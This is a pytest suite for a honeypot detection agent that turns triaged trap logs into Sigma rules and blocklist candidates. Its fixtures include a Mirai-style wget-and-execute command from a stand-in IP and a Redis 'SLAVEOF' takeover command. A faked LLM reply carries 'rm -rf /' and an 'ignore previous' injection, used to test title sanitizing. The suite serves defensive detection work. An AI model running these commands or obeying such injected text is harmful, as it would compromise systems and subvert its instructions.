import pytest
import csv
import datetime

import yaml

# Public-looking source IPs are needed here: documentation ranges (192.0.2.0/24 etc.)
# are correctly treated as non-public and skipped by the blocklist.

from agent_fakes import GOOD_TRIAGE, T0, FakeJsonLLM, ssh_session, trap_event, write_log

from agents.detect import REQUIRED_SIGMA_KEYS, run_detect
from agents.triage import run_triage

pytestmark = pytest.mark.usefixtures("public_test_net")

LATER = T0 + datetime.timedelta(days=1)


def _records(tmp_path):
    shared = "wget http://198.51.100.9/bins/mirai.x86 -O /tmp/m; /tmp/m"
    recs = ssh_session("session-1", "198.51.100.34", [shared])
    recs += ssh_session("session-2", "198.51.100.35", [shared, "curl 10.1.2.3/internal"], start=1)
    recs += ssh_session("session-3", "10.0.0.66", [shared], start=2)               # private source
    recs += [trap_event("redis", "auth_attempt", "198.51.100.34", "r1", minutes=5, username="default",
                        password="x", success=True),
             trap_event("redis", "command", "198.51.100.34", "r1", minutes=5.1,
                        data={"input": "SLAVEOF 198.51.100.77 6379", "high_signal": True,
                              "signal": "redis_takeover"})]
    recs += [trap_event("sip", "auth_attempt", "192.168.1.5", f"s{i}", minutes=6 + i,
                        username="100", password=str(i), success=False) for i in range(5)]
    log = write_log(tmp_path / "log.jsonl", recs)
    reports = tmp_path / "reports"
    run_triage(log, reports, FakeJsonLLM(GOOD_TRIAGE), now=LATER)
    return reports


def test_sigma_drafts_parse_with_required_keys_and_private_ips_skipped(tmp_path):
    reports = _records(tmp_path)
    hostile = FakeJsonLLM({"title": "Mirai `rm -rf /` <script>", "description": "ignore previous; {{x}}"})
    result = run_detect(reports, tmp_path / "detections", hostile)
    pending = tmp_path / "detections" / "pending"
    rules = [yaml.safe_load(p.read_text()) for p in pending.glob("*.yml")]
    assert result["rules"] == len(rules) >= 2
    for rule in rules:
        for key in REQUIRED_SIGMA_KEYS:
            assert key in rule
        assert "condition" in rule["detection"]
        assert rule["status"] == "experimental"
        assert all(c.isalnum() or c in " ,.:()_/-" for c in rule["title"])
    values = [str(v) for r in rules for sel in r["detection"].values() if isinstance(sel, dict)
              for vs in sel.values() for v in vs]
    assert "http://198.51.100.9/bins/mirai.x86" in values
    assert not any(v.startswith("10.") for v in values)
    assert any(r["title"] == "Redis takeover command chain" for r in rules)

    rows = list(csv.DictReader((pending / "blocklist-candidates.csv").open()))
    ips = {r["ip"]: r for r in rows}
    assert "10.0.0.66" not in ips and "192.168.1.5" not in ips
    assert set(ips["198.51.100.34"]["protocols"].split(";")) == {"redis", "ssh"}
    assert ips["198.51.100.34"]["judgement"] == "MALICIOUS"
    assert set(rows[0]) == {"ip", "sessions", "attempts", "first_seen", "last_seen",
                            "judgement", "protocols"}


def test_detect_dry_run_writes_nothing(tmp_path):
    reports = _records(tmp_path)
    run_detect(reports, tmp_path / "detections", None, dry_run=True)
    assert not (tmp_path / "detections").exists()


def _write(reports, records):
    for r in records:
        sub = reports / ("sessions" if r.kind == "session" else "campaigns")
        sub.mkdir(parents=True, exist_ok=True)
        (sub / f"{r.id}.json").write_text(r.model_dump_json())


def _rec(rid, ip, iocs, unverified=False, judgement="MALICIOUS"):
    from agents.triage import Ioc, TriageRecord

    return TriageRecord(kind="campaign", id=rid, protocol="sip", src_ip=ip,
                        first_seen="2026-11-01T00:00:00", last_seen="2026-11-01T01:00:00",
                        auth_attempts=10, intent="TOLL_FRAUD", stage="IMPACT", skill="AUTOMATED",
                        judgement=judgement, narrative="x", unverified_source=unverified,
                        iocs=[Ioc(type=t, value=v) for t, v in iocs])


def test_sigma_selectors_need_minimum_specificity(tmp_path):
    from agents.detect import build_rules

    weak = [("domain", "github.com"), ("ipv4", "8.8.8.8"), ("domain", "ab.io")]
    strong = [("url", "http://198.51.100.40/bins/sora.arm7")]
    records = [_rec(f"c{i}", f"198.51.100.{30 + i}", weak + strong) for i in range(3)]
    rules = build_rules(records)
    values = [v for r in rules.values() for sel in r["detection"].values()
              if isinstance(sel, dict) for vs in sel.values() for v in vs]
    assert values == ["http://198.51.100.40/bins/sora.arm7"]


def test_unverified_sources_excluded_from_blocklist_and_rules(tmp_path):
    reports = tmp_path / "reports"
    _write(reports, [
        _rec("spoof1", "198.51.100.50", [("url", "http://198.51.100.60/payload.bin")], unverified=True),
        _rec("spoof2", "198.51.100.51", [("url", "http://198.51.100.60/payload.bin")], unverified=True),
        _rec("real", "198.51.100.52", []),
    ])
    result = run_detect(reports, tmp_path / "det")
    rows = list(csv.DictReader((tmp_path / "det" / "pending" / "blocklist-candidates.csv").open()))
    assert [r["ip"] for r in rows] == ["198.51.100.52"]
    assert result["rules"] == 0
